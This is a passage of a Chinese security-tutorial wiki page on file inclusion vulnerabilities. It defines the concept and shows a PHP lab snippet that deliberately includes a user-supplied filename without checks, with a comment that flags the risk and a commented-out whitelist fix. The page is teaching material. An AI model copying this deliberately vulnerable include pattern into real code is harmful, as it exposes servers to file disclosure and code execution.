
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
  
  <meta name="generator" content="Hexo 7.3.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#f8f8f8">
  
  <title>VulnerabilityInsightDocs：七. 文件包含 - SafeKiller Zone</title>

  
    <meta name="description" content="总字符数: 21.17K                代码: 6.31K, 文本: 7.43K               预计阅读时间: 60 分钟              什么是文件包含? 开发人员将可重复使用的内容写到单个文件中,使用时直接调用此文件. 文件包含在PHP中非常常用,可以实现代码的模块化和重用.比如,将一些公共的函数或类单独放在一个文件中,在需要使用的时候通过文件">
<meta property="og:type" content="website">
<meta property="og:title" content="七. 文件包含">
<meta property="og:url" content="https://jiangjiyue.github.io/wiki/VulnerabilityInsightDocs/%E4%B8%83.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html">
<meta property="og:site_name" content="SafeKiller Zone">
<meta property="og:description" content="总字符数: 21.17K                代码: 6.31K, 文本: 7.43K               预计阅读时间: 60 分钟              什么是文件包含? 开发人员将可重复使用的内容写到单个文件中,使用时直接调用此文件. 文件包含在PHP中非常常用,可以实现代码的模块化和重用.比如,将一些公共的函数或类单独放在一个文件中,在需要使用的时候通过文件">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306051016521.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202305082232808.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051538346.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051540191.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847525.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051542552.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847525.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847525.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102141022.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102141318.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102142133.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102142324.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102143438.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102143424.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202305082233073.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051546265.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051551760.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847445.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847470.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847509.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847543.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847569.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847442.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847481.png">
<meta property="article:published_time" content="2009-04-22T19:24:48.000Z">
<meta property="article:modified_time" content="2024-02-11T10:40:28.000Z">
<meta property="article:author" content="Kill3r">
<meta property="article:tag" content="Linux, Nginx, Zabbix, ELK, Security, Penetration">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306051016521.png">
  
  
  
  <meta name="keywords" content="Linux, Nginx, Zabbix, ELK, Security, Penetration">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.27.0">

  
    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
  

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
</head>
<body>



<div class="l_body s:aa content tech" id="start" layout="wiki" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402020909750.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></div><a class="title" href="/wiki/VulnerabilityInsightDocs/%E4%B8%80.%20%E4%BB%8E%E8%BE%93%E5%85%A5%E8%AE%B2%E8%B5%B7.html"><div class="main" ff="title">VulnerabilityInsightDocs</div><div class="sub normal cap">漏洞篇</div><div class="sub hover cap" style="opacity:0"> 涵盖网络安全漏洞识别与防御、风险评估及攻防演练</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/VulnerabilityInsightDocs" placeholder="搜索常见漏洞分析内容..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item active" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
</div>
<div class="widgets">

<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">漏洞挖掘理论</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%B8%80.%20%E4%BB%8E%E8%BE%93%E5%85%A5%E8%AE%B2%E8%B5%B7.html#start"><span class="toc-text">一. 从输入讲起</span></a></div><div class="widget-header dis-select"><span class="name">暴力破解</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%BA%8C.%20%E5%BC%B1%E5%8F%A3%E4%BB%A4.html"><span class="toc-text">二. 弱口令</span></a><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%BA%8C.%20%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.html"><span class="toc-text">二. 在线密码破解</span></a><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%BA%8C.%20%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.html"><span class="toc-text">二. 离线密码破解</span></a></div><div class="widget-header dis-select"><span class="name">数据库安全</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%B8%89.%20SQL%E6%B3%A8%E5%85%A5.html"><span class="toc-text">三. SQL注入</span></a><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%B8%89.%20SqlMap%E4%BD%BF%E7%94%A8.html"><span class="toc-text">三. SqlMap使用</span></a></div><div class="widget-header dis-select"><span class="name">XSS跨站脚本攻击</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%BA%94.%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html"><span class="toc-text">五. XSS跨站脚本</span></a></div><div class="widget-header dis-select"><span class="name">文件上传</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%85%AD.%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html"><span class="toc-text">六. 文件上传</span></a></div><div class="widget-header dis-select"><span class="name">文件包含</span></div><div class="widget-body fs14"><a class="link active" href="/wiki/VulnerabilityInsightDocs/%E4%B8%83.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html"><span class="toc-text">七. 文件包含</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div><div class="widget-header dis-select"><span class="name">同源策略</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%85%AB.%20%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5.html"><span class="toc-text">八. 同源策略</span></a></div><div class="widget-header dis-select"><span class="name">CSRF跨站请求伪造</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E4%B9%9D.%20CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0.html"><span class="toc-text">九. CSRF跨站请求伪造</span></a></div><div class="widget-header dis-select"><span class="name">SSRF服务端请求伪造</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81.%20SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0.html"><span class="toc-text">十. SSRF服务端请求伪造</span></a></div><div class="widget-header dis-select"><span class="name">九、远程代码执行&命令执行</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E4%B8%80.%20RCE.html"><span class="toc-text">十一. RCE</span></a></div><div class="widget-header dis-select"><span class="name">XXE和XPath注入</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E4%BA%8C.%20XXE&XPath.html"><span class="toc-text">十二. XXE&XPath</span></a></div><div class="widget-header dis-select"><span class="name">未授权访问</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E4%B8%89.%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"><span class="toc-text">十三. 未授权访问</span></a></div><div class="widget-header dis-select"><span class="name">逻辑漏洞</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E5%9B%9B.%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html"><span class="toc-text">十四. 逻辑漏洞</span></a><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E5%9B%9B.%20%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html"><span class="toc-text">十四. 业务逻辑漏洞</span></a></div><div class="widget-header dis-select"><span class="name">反序列化</span></div><div class="widget-body fs14"><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E4%BA%94.%20PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><span class="toc-text">十五. PHP反序列化</span></a><a class="link" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E4%BA%94.%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><span class="toc-text">十五. Java反序列化</span></a></div></widget>



<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/wiki/VirtDocs/%E4%B8%89.%20%E5%A4%A7%E5%9E%8B%E5%88%86%E5%B8%83%E5%BC%8Fk8s%E9%9B%86%E7%BE%A4%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A.html"><span class="title"><strong>VirtDocs</strong><span class="dot"></span>三. 大型分布式k8s集群从入门到精通</span></a><a class="item title" href="/wiki/VulnerabilityInsightDocs/%E4%BA%94.%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html"><span class="title"><strong>VulnerabilityInsightDocs</strong><span class="dot"></span>五. XSS跨站脚本</span></a><a class="item title" href="/wiki/VirtDocs/%E4%BA%8C.%20Docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A.html"><span class="title"><strong>VirtDocs</strong><span class="dot"></span>二. Docker从入门到精通</span></a><a class="item title" href="/wiki/VulnerabilityInsightDocs/%E4%BA%8C.%20%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.html"><span class="title"><strong>VulnerabilityInsightDocs</strong><span class="dot"></span>二. 在线密码破解</span></a><a class="item title" href="/wiki/VulnerabilityInsightDocs/%E5%8D%81%E5%9B%9B.%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html"><span class="title"><strong>VulnerabilityInsightDocs</strong><span class="dot"></span>十四. 逻辑漏洞</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/VulnerabilityInsightDocs/%E4%B8%80.%20%E4%BB%8E%E8%BE%93%E5%85%A5%E8%AE%B2%E8%B5%B7.html">VulnerabilityInsightDocs</a></div>
<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2024-02-11T10:40:28.000Z">2024-02-11</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>七. 文件包含</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
    <p>总字符数: 21.17K </p>
    </div>
    <div class="cell" style="">
    <p>代码: 6.31K, 文本: 7.43K</p>
    </div>
    <div class="cell" style="">
    <p>预计阅读时间: 60 分钟</p>
    </div>
    </div>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306051016521.png" data-fancybox="true"/></div></div>

<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含?"></a>什么是文件包含?</h2><blockquote>
<p>开发人员将可重复使用的内容写到单个文件中,使用时直接调用此文件.</p>
<p>文件包含在PHP中非常常用,可以实现代码的模块化和重用.比如,将一些公共的函数或类单独放在一个文件中,在需要使用的时候通过文件包含即可使用这些函数或类,避免了重复编写代码的问题.</p>
</blockquote>
<figure class="highlight php"><figcaption><span>文件包含</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 初始化 HTML 变量</span></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交表单且文件名不为空</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取文件名</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 直接包含文件,存在安全风险,可能导致文件包含漏洞</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全的写法,使用白名单,严格指定包含的文件名</span></span><br><span class="line">    <span class="comment">// if ($filename == &#x27;file1.php&#x27; || $filename == &#x27;file2.php&#x27; || $filename == &#x27;file3.php&#x27; || $filename == &#x27;file4.php&#x27; || $filename == &#x27;file5.php&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     include &quot;$filename&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">main</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">main</span>-<span class="title">content</span>-<span class="title">inner</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">breadcrumbs</span> <span class="title">ace</span>-<span class="title">save</span>-<span class="title">state</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">h1</span>&gt;本地文件包含&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span>&gt;请输入一个路径&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">get</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;!-- 输入文件名的文本框 --&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">filename</span>&quot; <span class="title">placeholder</span>=&quot;输入文件名&quot; /&gt;</span></span><br><span class="line"><span class="class">                    &lt;!-- 提交按钮 --&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">sub</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span 